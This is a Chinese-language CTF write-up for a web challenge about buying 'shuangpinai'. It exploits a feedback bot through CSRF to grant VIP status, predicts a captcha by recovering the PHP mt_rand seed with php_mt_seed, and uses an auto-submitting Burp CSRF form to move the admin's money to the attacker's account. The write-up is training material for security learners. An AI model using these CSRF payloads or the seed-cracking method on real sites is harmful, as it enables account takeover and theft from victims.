## WriteUp

进去注册登录后进入主界面，题目提示要搞到双皮奶，进入点餐界面选双皮奶，提示需要vip。观察了一下题目各处的线索：源码中提示有管理界面，用于设置vip身份，主页下方的对话框有提示 `狮吼功继承人` 会点击我们发送到反馈的链接。结合题目hint可以知道是CSRF。

伪造好一个设置vip的url：

```
http://mc.vveelin.com.cn:8102/mng.php?name=user&vip=true
```

在反馈界面需要输入验证码，在页面注释中找到了验证码的生成算法

```HTML
<!--?php
//真的随机吗？
$seed = file_get_contents("/seed");
mt_srand($seed);
mt_rand();// == 1567320364
mt_rand();
mt_rand();
mt_rand();
mt_rand();
mt_rand();
$code = md5(mt_rand());
echo file_get_contents("random.php");
?-->
```

利用的伪随机数来生成验证码，由于给出了第一个随机数计算结果，用 `php_mt_seed` 得到种子：

```shell
# ./php_mt_seed 1567320364
Pattern: EXACT
Version: 3.0.7 to 5.2.0
Found 0, trying 0xa8000000 - 0xabffffff, speed 10840.7 Mseeds/s 
seed = 0xaa4cbfec = 2857156588 (PHP 3.0.7 to 5.2.0)
seed = 0xaa4cbfed = 2857156589 (PHP 3.0.7 to 5.2.0)
Found 2, trying 0xfc000000 - 0xffffffff, speed 10569.6 Mseeds/s 
Version: 5.2.1+
Found 2, trying 0x00000000 - 0x01ffffff, speed 0.0 Mseeds/s 
seed = 0x000a2c2a = 666666 (PHP 7.1.0+)
Found 3, trying 0x16000000 - 0x17ffffff, speed 103.7 Mseeds/s 
seed = 0x16b73644 = 381105732 (PHP 5.2.1 to 7.0.x; HHVM)
Found 4, trying 0xbe000000 - 0xbfffffff, speed 106.0 Mseeds/s 
seed = 0xbf3e7fc3 = 3208544195 (PHP 7.1.0+)                     
Found 5, trying 0xfe000000 - 0xffffffff, speed 106.0 Mseeds/s   Found 5
```

得到的 `666666` 很可疑，种子应该就是它，把种子代入上面的php代码中运行得到验证码 `2bfd7154e1f327a42dae866bac9ecd45` ，再把设置自己为vip的url反馈上去，过一会发现自己变成了vip。

再去买双皮奶提示钱不够，要很多钱，看了有转账的界面，构造一个表单提交：

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://mc.vveelin.com.cn:8102/trans.php" method="POST">
      <input type="hidden" name="username" value="user" />
      <input type="hidden" name="money" value="999999999999" />
      <input type="submit" value="Submit request" />
    </form>
    <script language=javascript>
      setTimeout("document.forms[0].submit()",1000)
    </script>
  </body>
</html>
```

挂载在公网服务器上

因为狮吼功继承人收取了很多租金，有很多很多钱，还是把链接发上反馈

```
http://example.geek/PoC.html     //示例链接
```

过一会钱就变多了，再次购买双皮奶，拿到flag